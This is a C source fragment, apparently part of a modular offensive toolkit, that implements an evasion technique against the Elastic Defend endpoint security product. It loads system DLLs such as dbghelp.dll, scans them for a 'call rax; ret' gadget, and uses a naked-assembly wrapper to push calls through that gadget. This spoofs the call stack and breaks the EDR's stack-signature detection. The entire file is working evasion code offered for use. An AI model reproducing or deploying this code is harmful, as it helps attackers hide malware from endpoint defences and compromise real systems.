// chunk: evasion/elastic_gadget
// depends: (none)
// provides: init_elastic_gadget, elastic_call
// headers: windows.h
// note: Elastic Defend call gadget bypass — loads system DLL with call-rax gadget, provides call wrapper to insert gadget DLL into call stack and break EDR stack signature patterns.

#ifndef CHUNK_ELASTIC_GADGET
#define CHUNK_ELASTIC_GADGET

static void *g_elastic_gadget = NULL;

static void *scan_call_gadget(HMODULE hMod) {
    BYTE *base = (BYTE *)hMod;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            BYTE *start = base + sec[i].VirtualAddress;
            DWORD size = sec[i].Misc.VirtualSize;
            for (DWORD j = 0; j + 3 <= size; j++) {
                if (start[j] == 0xFF && start[j+1] == 0xD0 && start[j+2] == 0xC3)
                    return (void *)(start + j);
            }
        }
    }
    return NULL;
}

static int init_elastic_gadget(void) {
    const char *dlls[] = {
        "dsdmo.dll", "msdmo.dll", "devobj.dll", "dbghelp.dll", NULL
    };
    for (int i = 0; dlls[i]; i++) {
        HMODULE h = LoadLibraryA(dlls[i]);
        if (h) {
            void *g = scan_call_gadget(h);
            if (g) {
                g_elastic_gadget = g;
                return 1;
            }
        }
    }
    return 0;
}

__attribute__((naked))
static void *elastic_call(void *fn, ...) {
    __asm__ __volatile__ (
        "mov g_elastic_gadget(%%rip), %%r11\n\t"
        "test %%r11, %%r11\n\t"
        "jz 1f\n\t"
        "mov %%rcx, %%rax\n\t"
        "mov %%rdx, %%rcx\n\t"
        "mov %%r8, %%rdx\n\t"
        "mov %%r9, %%r8\n\t"
        "mov 0x28(%%rsp), %%r9\n\t"
        "sub $0x20, %%rsp\n\t"
        "call *%%r11\n\t"
        "add $0x20, %%rsp\n\t"
        "ret\n\t"
        "1:\n\t"
        "mov %%rcx, %%rax\n\t"
        "mov %%rdx, %%rcx\n\t"
        "mov %%r8, %%rdx\n\t"
        "mov %%r9, %%r8\n\t"
        "mov 0x28(%%rsp), %%r9\n\t"
        "jmp *%%rax\n\t"
        ::: "memory"
    );
}

#endif
